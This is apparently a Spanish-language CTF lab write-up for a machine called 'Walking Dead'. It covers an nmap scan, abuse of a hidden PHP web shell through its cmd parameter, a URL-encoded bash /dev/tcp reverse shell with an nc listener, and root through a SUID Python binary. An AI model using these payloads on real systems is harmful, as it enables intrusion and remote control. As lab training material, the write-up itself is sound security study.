# Walking Dead
## Reconocimiento
```
❯ nmap -p 0-65535 --open -T5 -A -sT -Pn -n 172.17.0.2 -oX nmapScan.xml && xsltproc nmapScan.xml -o nmapScan.html && open nmapScan.html &>/dev/null & disown
```
Comienzo el reconocimiento escaneando con `nmap` los puertos de la máquina, hay un servidor SSH y uno HTTP, así que visito la página.

![Paso 1](imgs/1.png)

Explorando el código fuente me encuentro con un link "oculto", desde las herramientas de dev cambiamos los estilos y se puede ver claramente

![Paso 2](imgs/2.png)

El enlace lleva a la ruta `/hidden/.shell.php` al visitarla veo que está vacía, haciendo fuzzing encuentro también el endpoint `/backup.txt` pero al visitarlo me da un error 403.

## Explotación
Probando con el endpoint `shell.php` me doy cuenta que al pasar `cmd` como parámetro PHP se pueden ejecutar comandos.
```
http://172.17.0.2/hidden/.shell.php?cmd=whoami
```
URLencodeo el comando `bash -c 'bash -i >& /dev/tcp/192.168.1.157/443 0>&1'` para darme una revshell, al poner la URL `172.17.0.2/hidden/.shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.157%2F443%200%3E%261%27` y darle a enter ya estoy dentro como `www-data` (habiéndome puesto antes en escucha con `nc -nvlp 443`).
## Post explotación
En primer lugar, sanitizo la shell

![Paso 3](imgs/3.png)

Luego, viendo que binarios tienen permisos SUID veo que Python está entre ellos, con lo cual una búsqueda en GTFObins soluciona el laboratorio

![Paso 4](imgs/4.png)